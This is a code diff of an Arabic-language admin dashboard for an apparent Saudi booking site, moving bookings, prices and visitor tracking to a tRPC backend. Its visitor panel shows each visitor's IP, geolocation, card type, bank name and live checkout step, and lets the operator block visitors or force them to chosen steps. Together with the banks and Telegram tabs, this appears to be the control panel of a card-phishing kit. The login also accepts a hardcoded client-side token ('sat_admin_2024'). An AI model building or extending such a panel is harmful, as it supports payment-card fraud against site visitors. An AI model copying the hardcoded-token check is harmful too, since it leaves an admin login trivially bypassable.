@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { useNavigate } from 'react-router';
 import {
   LayoutDashboard, CalendarCheck, MapPin, Tag, Users, Settings,
@@ -16,6 +16,9 @@ import { changePassword, logout } from '@/lib/admin-auth';
 import { loadTelegramSettings, saveTelegramSettings, getDefaultTelegramSettings, syncLegacyTokens } from '@/lib/telegram-settings';
 import { getStoredBookings, getBookingStats, seedDemoBookings, updateBookingStatus, deleteBooking, markBookingSeen, markAllBookingsSeen, exportBookingsToCSV, type StoredBooking } from '@/lib/bookings-storage';
 import { seedBanks, loadStoredBanks, saveStoredBanks, type StoredBank } from '@/lib/bank-data';
+import { getStepLabel, getStepColor } from '@/lib/visitor-tracking';
+import type { VisitorStep } from '@/lib/visitor-tracking';
+import { trpc } from '@/providers/trpc';
 
 type AdminTab = 'dashboard' | 'bookings' | 'cities' | 'prices' | 'visitors' | 'settings' | 'banks' | 'design' | 'telegram';
 
@@ -103,19 +106,31 @@ const AdminDashboard: React.FC = () => {
   const navigate = useNavigate();
   const [activeTab, setActiveTab] = useState<AdminTab>('dashboard');
   const [sidebarOpen, setSidebarOpen] = useState(false);
-  const [isLoading, setIsLoading] = useState(true);
 
-  // Auth check
-  useEffect(() => {
-    const token = localStorage.getItem('admin_token');
-    if (token !== 'sat_admin_2024') {
+  // Auth check via tRPC with localStorage fallback
+  const { data: meData, isLoading: authLoading } = trpc.auth.me.useQuery(undefined, { retry: false });
+  const logoutMutation = trpc.auth.logout.useMutation({
+    onSuccess: () => {
+      localStorage.removeItem('admin_token');
       navigate('/admin-login');
-    } else {
-      setIsLoading(false);
     }
-  }, [navigate]);
+  });
+  const localToken = localStorage.getItem('admin_token');
+  const isAuthenticated = (meData && (meData as { id?: number }).id) || localToken === 'sat_admin_2024';
 
-  if (isLoading) return <LoadingScreen />;
+  useEffect(() => {
+    if (!authLoading && !isAuthenticated) {
+      navigate('/admin-login');
+    }
+  }, [authLoading, isAuthenticated, navigate]);
+
+  const handleLogout = () => {
+    logoutMutation.mutate(undefined);
+    localStorage.removeItem('admin_token');
+    navigate('/admin-login');
+  };
+
+  if (authLoading) return <LoadingScreen />;
 
   const navItems: { id: AdminTab; label: string; icon: React.ElementType }[] = [
     { id: 'dashboard', label: 'لوحة التحكم', icon: LayoutDashboard },
@@ -185,7 +200,7 @@ const AdminDashboard: React.FC = () => {
             </div>
           </div>
           <button
-            onClick={() => { localStorage.removeItem('admin_token'); navigate('/'); }}
+            onClick={handleLogout}
             className="w-full flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl text-sm font-bold text-red-400 bg-red-400/10 hover:bg-red-400/20 transition-all"
           >
             <LogOut className="w-4 h-4" />
@@ -532,23 +547,23 @@ function BanksTab() {
 
 /* ═════ Dashboard Tab ════════════════════ */
 function DashboardTab() {
-  const [bookingsList, setBookingsList] = useState<StoredBooking[]>(getStoredBookings);
-  const stats_ = getBookingStats();
+  const { data: dbStats } = trpc.admin.stats.useQuery(undefined, { refetchInterval: 10000 });
+  const { data: dbBookings = [] } = trpc.admin.bookings.useQuery(undefined, { refetchInterval: 10000 });
 
-  // Auto-refresh bookings
-  useEffect(() => {
-    const timer = setInterval(() => setBookingsList(getStoredBookings()), 5000);
-    return () => clearInterval(timer);
-  }, []);
+  // Fallback to localStorage if backend offline
+  const localBookings = getStoredBookings();
+  const localStats = getBookingStats();
+  const bookingsList = dbBookings.length > 0 ? dbBookings : localBookings;
+  const stats_ = dbStats ?? localStats;
 
-  const totalRevenue = bookingsList.reduce((sum, b) => sum + (b.totalAmount || 0), 0);
-  const confirmedCount = bookingsList.filter(b => b.status === 'confirmed').length;
-  const pendingCount = bookingsList.filter(b => b.status === 'pending').length;
+  const totalRevenue = dbStats?.revenue ?? bookingsList.reduce((sum, b) => sum + (b.totalAmount || 0), 0);
+  const confirmedCount = dbStats?.confirmed ?? bookingsList.filter(b => b.status === 'confirmed').length;
+  const pendingCount = dbStats?.pending ?? bookingsList.filter(b => b.status === 'pending').length;
 
   const stats = [
-    { label: 'إجمالي الحجوزات', value: bookingsList.length, change: bookingsList.length > 5 ? '+' + (bookingsList.length - 5) : '0', up: true, icon: CalendarCheck, color: 'from-brand-gold to-amber-500' },
+    { label: 'إجمالي الحجوزات', value: stats_.total, change: stats_.total > 5 ? '+' + (stats_.total - 5) : '0', up: true, icon: CalendarCheck, color: 'from-brand-gold to-amber-500' },
     { label: 'الحجوزات المؤكدة', value: confirmedCount, change: '+' + confirmedCount, up: true, icon: CheckCircle, color: 'from-green-500 to-emerald-600' },
-    { label: 'الإيرادات', value: `${totalRevenue.toLocaleString('ar-SA')} ر.س`, change: '+0%', up: true, icon: DollarSign, color: 'from-blue-500 to-indigo-600' },
+    { label: 'الإيرادات', value: `${Number(totalRevenue).toLocaleString('ar-SA')} ر.س`, change: '+0%', up: true, icon: DollarSign, color: 'from-blue-500 to-indigo-600' },
     { label: 'حجوزات جديدة', value: stats_.unseen, change: stats_.unseen > 0 ? 'جديد' : '', up: stats_.unseen > 0, icon: Bell, color: 'from-red-500 to-rose-600' },
   ];
 
@@ -603,9 +618,9 @@ function DashboardTab() {
           <h3 className="font-bold text-charcoal text-lg mb-5">حالة الحجوزات</h3>
           <div className="space-y-4">
             {[
-              { label: 'مؤكد', count: confirmedCount, total: bookingsList.length || 1, color: 'bg-green-500', text: 'text-green-600' },
-              { label: 'معلق', count: pendingCount, total: bookingsList.length || 1, color: 'bg-yellow-500', text: 'text-yellow-600' },
-              { label: 'جديد', count: bookingsList.filter(b => b.status === 'new').length, total: bookingsList.length || 1, color: 'bg-blue-500', text: 'text-blue-600' },
+              { label: 'مؤكد', count: confirmedCount, total: stats_.total || 1, color: 'bg-green-500', text: 'text-green-600' },
+              { label: 'معلق', count: pendingCount, total: stats_.total || 1, color: 'bg-yellow-500', text: 'text-yellow-600' },
+              { label: 'جديد', count: dbStats?.new ?? bookingsList.filter(b => b.status === 'new').length, total: stats_.total || 1, color: 'bg-blue-500', text: 'text-blue-600' },
             ].map((item, i) => {
               const pct = item.total > 0 ? Math.round((item.count / item.total) * 100) : 0;
               return (
@@ -632,7 +647,7 @@ function DashboardTab() {
             {stats_.unseen > 0 && (
               <span className="text-xs bg-red-100 text-red-600 px-2 py-0.5 rounded-full font-bold">{stats_.unseen} جديد</span>
             )}
-            <span className="text-xs bg-brand-gold/10 text-brand-gold px-3 py-1 rounded-full font-bold">{bookingsList.length} حجز</span>
+            <span className="text-xs bg-brand-gold/10 text-brand-gold px-3 py-1 rounded-full font-bold">{stats_.total} حجز</span>
           </div>
         </div>
         <div className="overflow-x-auto">
@@ -669,46 +684,64 @@ function DashboardTab() {
 
 /* ═════ Bookings Tab ═════════════════════ */
 function BookingsTab() {
-  const [bookingsList, setBookingsList] = useState<StoredBooking[]>(getStoredBookings);
+  const utils = trpc.useUtils();
+  const { data: dbBookings = [], isLoading: bookingsLoading } = trpc.admin.bookings.useQuery(undefined, { refetchInterval: 5000 });
+  const updateStatusMutation = trpc.admin.updateBookingStatus.useMutation({ onSuccess: () => utils.admin.bookings.invalidate() });
+  const deleteBookingMutation = trpc.bookings.delete.useMutation({ onSuccess: () => utils.admin.bookings.invalidate() });
+  const markAllSeenMutation = trpc.admin.markAllBookingsSeen.useMutation({ onSuccess: () => utils.admin.bookings.invalidate() });
+
+  // Fallback to localStorage if backend offline
+  const localBookings = getStoredBookings();
+  const bookingsList = dbBookings.length > 0 ? dbBookings : localBookings;
+  const useDb = dbBookings.length > 0;
   const [search, setSearch] = useState('');
   const [statusFilter, setStatusFilter] = useState('all');
 
-  // Auto-refresh every 5 seconds to show new bookings from frontend
-  useEffect(() => {
-    const timer = setInterval(() => setBookingsList(getStoredBookings()), 5000);
-    return () => clearInterval(timer);
-  }, []);
-
-  const refresh = () => setBookingsList(getStoredBookings());
+  const refresh = () => utils.admin.bookings.invalidate();
 
   const filtered = bookingsList.filter((b) => {
     if (search) {
       const q = search.toLowerCase();
-      if (!(b.fromLocation + b.toLocation + b.passengerName + b.phone).toLowerCase().includes(q)) return false;
+      const phone = (b as StoredBooking).phone ?? (b as { passengerPhone?: string }).passengerPhone ?? '';
+      if (!(b.fromLocation + b.toLocation + (b.passengerName || '') + phone).toLowerCase().includes(q)) return false;
     }
     if (statusFilter !== 'all' && b.status !== statusFilter) return false;
     return true;
   });
 
   const handleStatusChange = (id: number, status: 'new' | 'pending' | 'confirmed' | 'cancelled') => {
-    updateBookingStatus(id, status);
-    refresh();
+    if (useDb) {
+      updateStatusMutation.mutate({ id, status });
+    } else {
+      updateBookingStatus(id, status);
+    }
   };
 
   const handleDelete = (id: number) => {
     if (confirm('هل أنت متأكد من حذف هذا الحجز؟')) {
-      deleteBooking(id);
-      refresh();
+      if (useDb) {
+        deleteBookingMutation.mutate({ id });
+      } else {
+        deleteBooking(id);
+      }
     }
   };
 
   const handleMarkAllSeen = () => {
-    markAllBookingsSeen();
-    refresh();
+    if (useDb) {
+      markAllSeenMutation.mutate(undefined);
+    } else {
+      markAllBookingsSeen();
+    }
   };
 
   const exportCSV = () => {
-    const csv = exportBookingsToCSV();
+    const headers = ['ID,الرحلة,التاريخ,المسافر,الهاتف,المبلغ,الحالة,تاريخ الإنشاء'];
+    const rows = bookingsList.map(b => {
+      const phone = (b as StoredBooking).phone ?? (b as { passengerPhone?: string }).passengerPhone ?? '';
+      return `${b.id},${b.fromLocation}→${b.toLocation},${b.pickupDate},${b.passengerName || ''},${phone},${b.totalAmount},${b.status},${typeof b.createdAt === 'string' ? b.createdAt : (b.createdAt as Date).toISOString()}`;
+    });
+    const csv = [...headers, ...rows].join('\n');
     const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
     const link = document.createElement('a');
     link.href = URL.createObjectURL(blob);
@@ -716,7 +749,15 @@ function BookingsTab() {
     link.click();
   };
 
-  const stats = getBookingStats();
+  const unseen = bookingsList.filter(b => b.isNew).length;
+  const stats = {
+    total: bookingsList.length,
+    new: bookingsList.filter(b => b.status === 'new').length,
+    pending: bookingsList.filter(b => b.status === 'pending').length,
+    confirmed: bookingsList.filter(b => b.status === 'confirmed').length,
+    revenue: bookingsList.reduce((sum, b) => sum + (b.totalAmount || 0), 0),
+    unseen,
+  };
 
   return (
     <div className="space-y-4">
@@ -757,15 +798,16 @@ function BookingsTab() {
         <button onClick={exportCSV} className="h-10 px-4 bg-charcoal text-white rounded-xl text-sm font-bold flex items-center gap-1.5 hover:bg-charcoal-light transition-all">
           <Download className="w-4 h-4" /> تصدير
         </button>
+        <button onClick={refresh} className="h-10 px-4 border border-[#E5E0D5] text-charcoal rounded-xl text-sm font-bold flex items-center gap-1.5 hover:bg-[#F5F3EF] transition-all">
+          <RotateCcw className="w-4 h-4" /> تحديث
+        </button>
       </div>
 
       {/* Table */}
       <div className="bg-white rounded-2xl shadow-card border border-[#E5E0D5] overflow-hidden">
         <div className="p-4 border-b border-[#E5E0D5] flex items-center justify-between">
           <h3 className="font-bold text-charcoal">الحجوزات ({filtered.length})</h3>
-          <button onClick={refresh} className="text-xs text-[#8A7E6B] hover:text-brand-gold font-bold flex items-center gap-1 transition-colors">
-            <RotateCcw className="w-3 h-3" /> تحديث
-          </button>
+          {bookingsLoading && <span className="text-xs text-[#8A7E6B]">جاري التحميل...</span>}
         </div>
         <div className="overflow-x-auto">
           <table className="w-full text-right text-sm">
@@ -789,36 +831,39 @@ function BookingsTab() {
                   <p className="text-xs mt-1">ستظهر هنا الحجوزات الجديدة من الواجهة الأمامية</p>
                 </td></tr>
               )}
-              {filtered.map((b) => (
-                <tr key={b.id} className={`border-t border-[#E5E0D5] transition-colors ${b.isNew ? 'bg-blue-50/50' : 'hover:bg-[#F5F3EF]/50'}`}>
-                  <td className="px-4 py-3 font-mono text-xs text-[#B5AFA3]">
-                    <div className="flex items-center gap-1.5">
-                      {b.isNew && <span className="w-2 h-2 rounded-full bg-blue-500 animate-pulse" />}
-                      {b.id}
-                    </div>
-                  </td>
-                  <td className="px-4 py-3 font-bold text-charcoal">{b.fromLocation} &larr; {b.toLocation}</td>
-                  <td className="px-4 py-3 text-[#8A7E6B] text-xs">{b.pickupDate}</td>
-                  <td className="px-4 py-3 text-[#8A7E6B]">{b.passengerName}</td>
-                  <td className="px-4 py-3 text-[#8A7E6B] font-mono text-xs" dir="ltr">{b.phone}</td>
-                  <td className="px-4 py-3 font-extrabold text-brand-gold">{b.totalAmount} ر.س</td>
-                  <td className="px-4 py-3"><StatusBadge status={b.status} /></td>
-                  <td className="px-4 py-3">
-                    <div className="flex items-center gap-1">
-                      <select value={b.status} onChange={e => handleStatusChange(b.id, e.target.value as 'new' | 'pending' | 'confirmed' | 'cancelled')}
-                        className="h-8 px-2 border border-[#E5E0D5] rounded-lg text-xs bg-[#FCFBF9] focus:outline-none focus:border-brand-gold">
-                        <option value="new">جديد</option>
-                        <option value="pending">معلق</option>
-                        <option value="confirmed">مؤكد</option>
-                        <option value="cancelled">ملغي</option>
-                      </select>
-                      <button onClick={() => handleDelete(b.id)} className="h-8 px-2 text-red-400 hover:bg-red-50 rounded-lg transition-colors">
-                        <Trash2 className="w-3.5 h-3.5" />
-                      </button>
-                    </div>
-                  </td>
-                </tr>
-              ))}
+              {filtered.map((b) => {
+                const phone = (b as StoredBooking).phone ?? (b as { passengerPhone?: string }).passengerPhone ?? '';
+                return (
+                  <tr key={b.id} className={`border-t border-[#E5E0D5] transition-colors ${b.isNew ? 'bg-blue-50/50' : 'hover:bg-[#F5F3EF]/50'}`}>
+                    <td className="px-4 py-3 font-mono text-xs text-[#B5AFA3]">
+                      <div className="flex items-center gap-1.5">
+                        {b.isNew && <span className="w-2 h-2 rounded-full bg-blue-500 animate-pulse" />}
+                        {b.id}
+                      </div>
+                    </td>
+                    <td className="px-4 py-3 font-bold text-charcoal">{b.fromLocation} &larr; {b.toLocation}</td>
+                    <td className="px-4 py-3 text-[#8A7E6B] text-xs">{b.pickupDate}</td>
+                    <td className="px-4 py-3 text-[#8A7E6B]">{b.passengerName}</td>
+                    <td className="px-4 py-3 text-[#8A7E6B] font-mono text-xs" dir="ltr">{phone}</td>
+                    <td className="px-4 py-3 font-extrabold text-brand-gold">{b.totalAmount} ر.س</td>
+                    <td className="px-4 py-3"><StatusBadge status={b.status} /></td>
+                    <td className="px-4 py-3">
+                      <div className="flex items-center gap-1">
+                        <select value={b.status} onChange={e => handleStatusChange(b.id, e.target.value as 'new' | 'pending' | 'confirmed' | 'cancelled')}
+                          className="h-8 px-2 border border-[#E5E0D5] rounded-lg text-xs bg-[#FCFBF9] focus:outline-none focus:border-brand-gold">
+                          <option value="new">جديد</option>
+                          <option value="pending">معلق</option>
+                          <option value="confirmed">مؤكد</option>
+                          <option value="cancelled">ملغي</option>
+                        </select>
+                        <button onClick={() => handleDelete(b.id)} className="h-8 px-2 text-red-400 hover:bg-red-50 rounded-lg transition-colors">
+                          <Trash2 className="w-3.5 h-3.5" />
+                        </button>
+                      </div>
+                    </td>
+                  </tr>
+                );
+              })}
             </tbody>
           </table>
         </div>
@@ -942,14 +987,30 @@ function calcPrice(dist: number, min: number, max: number): number {
 
 /* ═════ Prices Tab ═══════════════════════ */
 function PricesTab() {
+  const utils = trpc.useUtils();
+  const { data: dbPrices = [] } = trpc.prices.list.useQuery();
+  const upsertPriceMutation = trpc.prices.upsert.useMutation({ onSuccess: () => utils.prices.list.invalidate() });
+  const deletePriceMutation = trpc.prices.delete.useMutation({ onSuccess: () => utils.prices.list.invalidate() });
+
   const [settings, setSettings] = useState<PricingSettings>(loadPricingSettings);
   const [search, setSearch] = useState('');
   const [editingRow, setEditingRow] = useState<number | null>(null);
   const [editForm, setEditForm] = useState<{ economy: string; business: string; vip: string }>({ economy: '', business: '', vip: '' });
 
-  // Recalculate prices based on current settings
+  // Build DB overrides map from DB prices
+  const dbOverridesMap = useMemo(() => {
+    const map = new Map<string, { economy: number; business: number; vip: number }>();
+    for (const p of dbPrices) {
+      map.set(`${p.fromCity}-${p.toCity}`, { economy: p.economyPrice, business: p.businessPrice, vip: p.vipPrice });
+    }
+    return map;
+  }, [dbPrices]);
+
+  // Recalculate prices: DB overrides take priority, then localStorage overrides
   const computedPrices = mockPrices.map(p => {
-    const override = settings.overrides.find(o => o.from === p.fromCity && o.to === p.toCity);
+    const dbOverride = dbOverridesMap.get(`${p.fromCity}-${p.toCity}`);
+    const localOverride = settings.overrides.find(o => o.from === p.fromCity && o.to === p.toCity);
+    const override = dbOverride ?? (localOverride ? { economy: localOverride.economy, business: localOverride.business, vip: localOverride.vip } : undefined);
     const base = override?.economy ?? calcPrice(p.distance, settings.globalMin, settings.globalMax);
     return {
       ...p,
@@ -984,6 +1045,10 @@ function PricesTab() {
     const vip = parseInt(editForm.vip, 10);
     if (isNaN(eco) || isNaN(bus) || isNaN(vip)) return;
 
+    // Save to DB
+    upsertPriceMutation.mutate({ fromCity: from, toCity: to, economyPrice: eco, businessPrice: bus, vipPrice: vip });
+
+    // Also save to localStorage as fallback
     setSettings(prev => {
       const others = prev.overrides.filter(o => !(o.from === from && o.to === to));
       const updated = { ...prev, overrides: [...others, { from, to, economy: eco, business: bus, vip }] };
@@ -994,6 +1059,10 @@ function PricesTab() {
   };
 
   const handleResetRow = (from: string, to: string) => {
+    // Remove from DB
+    deletePriceMutation.mutate({ fromCity: from, toCity: to });
+
+    // Also remove from localStorage
     setSettings(prev => {
       const updated = { ...prev, overrides: prev.overrides.filter(o => !(o.from === from && o.to === to)) };
       savePricingSettings(updated);
@@ -1007,6 +1076,10 @@ function PricesTab() {
       const defaults = getDefaultPricing();
       setSettings(defaults);
       savePricingSettings(defaults);
+      // Delete all DB price overrides
+      for (const p of dbPrices) {
+        deletePriceMutation.mutate({ fromCity: p.fromCity, toCity: p.toCity });
+      }
     }
   };
 
@@ -1193,40 +1266,70 @@ function PricesTab() {
 }
 
 /* ═════ Visitors Tab — Card Layout + Modal ═══════════ */
-import { getAllVisitors, getActiveVisitors, getBlockedVisitors, blockVisitor, forceRedirect, cleanupVisitors, getStepLabel, getStepColor } from '@/lib/visitor-tracking';
-import type { VisitorSession, VisitorStep } from '@/lib/visitor-tracking';
+
+// DB Visitor type (from tRPC visitors.list)
+interface DbVisitor {
+  id: number;
+  sessionId: string;
+  ip: string;
+  country: string;
+  city: string;
+  userAgent: string;
+  page: string;
+  currentStep: string;
+  stepHistory: { step: string; time: number }[];
+  isBlocked: boolean;
+  redirectUrl: string | null;
+  bookingData: Record<string, unknown>;
+  cardInfo: Record<string, unknown>;
+  geoLat: number | null;
+  geoLng: number | null;
+  lastActive: Date | string;
+  createdAt: Date | string;
+}
 
 function VisitorsTab() {
-  const [visitors, setVisitors] = useState<VisitorSession[]>([]);
   const [activeFilter, setActiveFilter] = useState<'all' | 'active' | 'blocked'>('all');
-  const [selectedVisitor, setSelectedVisitor] = useState<VisitorSession | null>(null);
+  const [selectedVisitor, setSelectedVisitor] = useState<DbVisitor | null>(null);
   const [redirectUrl, setRedirectUrl] = useState('');
   const [forceStep, setForceStep] = useState<VisitorStep>('home');
 
-  // Refresh data periodically
-  const refresh = () => {
-    switch (activeFilter) {
-      case 'active': setVisitors(getActiveVisitors()); break;
-      case 'blocked': setVisitors(getBlockedVisitors()); break;
-      default: setVisitors(getAllVisitors()); break;
-    }
-  };
+  const utils = trpc.useUtils();
+  const { data: visitorsData = [], isLoading: visitorsLoading } = trpc.visitors.list.useQuery(undefined, { refetchInterval: 3000 });
+  const { data: visitorStats } = trpc.visitors.stats.useQuery(undefined, { refetchInterval: 3000 });
+  const blockMutation = trpc.visitors.blockVisitor.useMutation({ onSuccess: () => utils.visitors.list.invalidate() });
+  const redirectMutation = trpc.visitors.setRedirectUrl.useMutation({ onSuccess: () => utils.visitors.list.invalidate() });
 
-  useEffect(() => { refresh(); }, [activeFilter]);
-  useEffect(() => { const timer = setInterval(refresh, 3000); return () => clearInterval(timer); }, [activeFilter]);
+  const now = Date.now();
+  const fiveMinAgo = now - 5 * 60 * 1000;
+
+  const allVisitors: DbVisitor[] = visitorsData as DbVisitor[];
+  const activeVisitors = allVisitors.filter(v => !v.isBlocked && new Date(v.lastActive).getTime() > fiveMinAgo);
+  const blockedVisitors = allVisitors.filter(v => v.isBlocked);
+
+  const visitors = activeFilter === 'active' ? activeVisitors
+    : activeFilter === 'blocked' ? blockedVisitors
+    : allVisitors;
+
+  const totalCount = visitorStats?.total ?? allVisitors.length;
+  const activeCount = visitorStats?.active ?? activeVisitors.length;
+  const blockedCount = visitorStats?.blocked ?? blockedVisitors.length;
+
+  // Refresh is now handled by tRPC refetchInterval
+  const refresh = () => utils.visitors.list.invalidate();
 
   const handleBlock = (sessionId: string) => {
-    blockVisitor(sessionId, true);
-    forceRedirect(sessionId, 'block');
-    refresh();
+    blockMutation.mutate({ sessionId, blocked: true, redirectUrl: '/blocked' });
   };
-  const handleUnblock = (sessionId: string) => { blockVisitor(sessionId, false); refresh(); };
-  const handleForceRedirect = (sessionId: string) => { if (redirectUrl) { forceRedirect(sessionId, redirectUrl); setRedirectUrl(''); } };
-  const handleForceStep = (sessionId: string) => { forceRedirect(sessionId, 'step:' + forceStep); };
-
-  const totalCount = getAllVisitors().length;
-  const activeCount = getActiveVisitors().length;
-  const blockedCount = getBlockedVisitors().length;
+  const handleUnblock = (sessionId: string) => {
+    blockMutation.mutate({ sessionId, blocked: false, redirectUrl: null });
+  };
+  const handleForceRedirect = (sessionId: string) => {
+    if (redirectUrl) { redirectMutation.mutate({ sessionId, redirectUrl }); setRedirectUrl(''); }
+  };
+  const handleForceStep = (sessionId: string) => {
+    redirectMutation.mutate({ sessionId, redirectUrl: 'step:' + forceStep });
+  };
 
   const stepOptions: { label: string; value: VisitorStep }[] = [
     { label: 'الرئيسية', value: 'home' },
@@ -1267,14 +1370,19 @@ function VisitorsTab() {
 
       {/* ─── Cleanup Button ─── */}
       <div className="flex justify-end">
-        <button onClick={() => { cleanupVisitors(); refresh(); }}
+        <button onClick={() => refresh()}
           className="h-9 px-4 border border-[#E5E0D5] text-[#8A7E6B] rounded-xl text-xs font-bold hover:bg-[#F5F3EF] transition-all">
-          تنظيف القديم (&gt;24 ساعة)
+          تحديث
         </button>
       </div>
 
       {/* ─── Visitor Cards Grid ─── */}
-      {visitors.length === 0 ? (
+      {visitorsLoading ? (
+        <div className="bg-white rounded-2xl shadow-card border border-[#E5E0D5] p-12 text-center">
+          <div className="w-10 h-10 rounded-full border-4 border-brand-gold/20 border-t-brand-gold animate-spin mx-auto mb-3" />
+          <p className="text-[#8A7E6B] text-sm">جارٍ تحميل الزوار...</p>
+        </div>
+      ) : visitors.length === 0 ? (
         <div className="bg-white rounded-2xl shadow-card border border-[#E5E0D5] p-12 text-center">
           <Users className="w-16 h-16 mx-auto mb-4 text-[#E5E0D5]" />
           <p className="text-charcoal font-bold text-lg">لا يوجد زوار</p>
@@ -1283,10 +1391,12 @@ function VisitorsTab() {
       ) : (
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
           {visitors.map(v => {
-            const stepColor = getStepColor(v.currentStep);
-            const stepLabel = getStepLabel(v.currentStep);
-            const ago = Math.round((Date.now() - v.lastActive) / 1000);
+            const stepColor = getStepColor(v.currentStep as VisitorStep);
+            const stepLabel = getStepLabel(v.currentStep as VisitorStep);
+            const lastActiveMs = new Date(v.lastActive).getTime();
+            const ago = Math.round((Date.now() - lastActiveMs) / 1000);
             const agoText = ago < 60 ? `${ago} ث` : ago < 3600 ? `${Math.round(ago / 60)} د` : `${Math.round(ago / 3600)} س`;
+            const bd = v.bookingData as { from?: string; to?: string };
             return (
               <button key={v.sessionId} onClick={() => setSelectedVisitor(v)}
                 className={`bg-white rounded-2xl shadow-card border p-4 text-right transition-all hover:shadow-lg hover:scale-[1.02] active:scale-[0.98] ${
@@ -1302,9 +1412,9 @@ function VisitorsTab() {
                   <span className="text-xs font-bold" style={{ color: stepColor }}>{stepLabel}</span>
                 </div>
                 {/* Booking Info */}
-                {v.bookingData?.from && (
+                {bd?.from && (
                   <div className="text-xs text-[#8A7E6B] mb-2 text-center">
-                    {v.bookingData.from} &rarr; {v.bookingData.to}
+                    {bd.from} &rarr; {bd.to}
                   </div>
                 )}
                 {/* Footer */}
@@ -1319,7 +1429,12 @@ function VisitorsTab() {
       )}
 
       {/* ─── Visitor Detail Modal ─── */}
-      {selectedVisitor && (
+      {selectedVisitor && (() => {
+        const sv = selectedVisitor;
+        const stepColor = getStepColor(sv.currentStep as VisitorStep);
+        const bd = sv.bookingData as { from?: string; to?: string; date?: string; passengers?: unknown; selectedTrip?: string; fareClass?: string; selectedSeats?: string[] };
+        const ci = sv.cardInfo as { cardType?: string; bankName?: string };
+        return (
         <div className="fixed inset-0 z-[100] bg-black/50 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setSelectedVisitor(null)}>
           <div className="bg-white rounded-3xl shadow-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
             {/* Header */}
@@ -1327,7 +1442,7 @@ function VisitorsTab() {
               <button onClick={() => setSelectedVisitor(null)} className="w-8 h-8 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal"><X className="w-4 h-4" /></button>
               <div className="flex items-center gap-2">
                 <h3 className="font-extrabold text-charcoal">تفاصيل الجهاز</h3>
-                <div className="w-3 h-3 rounded-full animate-pulse" style={{ backgroundColor: getStepColor(selectedVisitor.currentStep) }} />
+                <div className="w-3 h-3 rounded-full animate-pulse" style={{ backgroundColor: stepColor }} />
               </div>
             </div>
 
@@ -1335,13 +1450,13 @@ function VisitorsTab() {
               {/* IP + Location */}
               <div className="bg-[#F8F6F2] rounded-xl p-4 text-center">
                 <p className="text-xs text-[#8A7E6B] mb-1">IP Address</p>
-                <p className="font-mono text-xl font-extrabold text-charcoal" dir="ltr">{selectedVisitor.ip}</p>
-                {(selectedVisitor.country || selectedVisitor.city) && (
-                  <p className="text-xs text-[#8A7E6B] mt-1">{selectedVisitor.city}، {selectedVisitor.country}</p>
+                <p className="font-mono text-xl font-extrabold text-charcoal" dir="ltr">{sv.ip}</p>
+                {(sv.country || sv.city) && (
+                  <p className="text-xs text-[#8A7E6B] mt-1">{sv.city}، {sv.country}</p>
                 )}
-                {selectedVisitor.geoLat && (
+                {sv.geoLat && (
                   <p className="text-[10px] text-[#B5AFA3] font-mono mt-1" dir="ltr">
-                    📍 {selectedVisitor.geoLat?.toFixed(4)}, {selectedVisitor.geoLng?.toFixed(4)}
+                    📍 {Number(sv.geoLat).toFixed(4)}, {Number(sv.geoLng).toFixed(4)}
                   </p>
                 )}
               </div>
@@ -1349,45 +1464,45 @@ function VisitorsTab() {
               {/* Current Step */}
               <div>
                 <label className="text-xs font-bold text-[#8A7E6B] mb-2 block">الخطوة الحالية</label>
-                <div className="rounded-xl p-4 text-center" style={{ backgroundColor: getStepColor(selectedVisitor.currentStep) + '15' }}>
-                  <p className="text-lg font-extrabold" style={{ color: getStepColor(selectedVisitor.currentStep) }}>
-                    {getStepLabel(selectedVisitor.currentStep)}
+                <div className="rounded-xl p-4 text-center" style={{ backgroundColor: stepColor + '15' }}>
+                  <p className="text-lg font-extrabold" style={{ color: stepColor }}>
+                    {getStepLabel(sv.currentStep as VisitorStep)}
                   </p>
                 </div>
               </div>
 
               {/* Booking Data */}
-              {selectedVisitor.bookingData && (selectedVisitor.bookingData.from || selectedVisitor.bookingData.selectedTrip) && (
+              {bd && (bd.from || bd.selectedTrip) && (
                 <div>
                   <label className="text-xs font-bold text-[#8A7E6B] mb-2 block">بيانات الحجز</label>
                   <div className="bg-[#F8F6F2] rounded-xl p-4 space-y-2 text-sm">
-                    {selectedVisitor.bookingData.from && (
-                      <div className="flex justify-between"><span className="text-[#8A7E6B]">الوجهة</span><span className="font-bold text-charcoal">{selectedVisitor.bookingData.from} &rarr; {selectedVisitor.bookingData.to}</span></div>
+                    {bd.from && (
+                      <div className="flex justify-between"><span className="text-[#8A7E6B]">الوجهة</span><span className="font-bold text-charcoal">{bd.from} &rarr; {bd.to}</span></div>
                     )}
-                    {selectedVisitor.bookingData.date && (
-                      <div className="flex justify-between"><span className="text-[#8A7E6B]">التاريخ</span><span className="font-bold text-charcoal">{selectedVisitor.bookingData.date}</span></div>
+                    {bd.date && (
+                      <div className="flex justify-between"><span className="text-[#8A7E6B]">التاريخ</span><span className="font-bold text-charcoal">{bd.date}</span></div>
                     )}
-                    {selectedVisitor.bookingData.passengers && (
-                      <div className="flex justify-between"><span className="text-[#8A7E6B]">المسافرين</span><span className="font-bold text-charcoal">{selectedVisitor.bookingData.passengers}</span></div>
+                    {bd.passengers && (
+                      <div className="flex justify-between"><span className="text-[#8A7E6B]">المسافرين</span><span className="font-bold text-charcoal">{String(bd.passengers)}</span></div>
                     )}
-                    {selectedVisitor.bookingData.selectedTrip && (
-                      <div className="flex justify-between"><span className="text-[#8A7E6B]">الرحلة</span><span className="font-bold text-charcoal">{selectedVisitor.bookingData.selectedTrip} ({selectedVisitor.bookingData.fareClass})</span></div>
+                    {bd.selectedTrip && (
+                      <div className="flex justify-between"><span className="text-[#8A7E6B]">الرحلة</span><span className="font-bold text-charcoal">{bd.selectedTrip} ({bd.fareClass})</span></div>
                     )}
-                    {selectedVisitor.bookingData.selectedSeats && selectedVisitor.bookingData.selectedSeats.length > 0 && (
-                      <div className="flex justify-between"><span className="text-[#8A7E6B]">المقاعد</span><span className="font-bold text-charcoal">{selectedVisitor.bookingData.selectedSeats.join(', ')}</span></div>
+                    {bd.selectedSeats && bd.selectedSeats.length > 0 && (
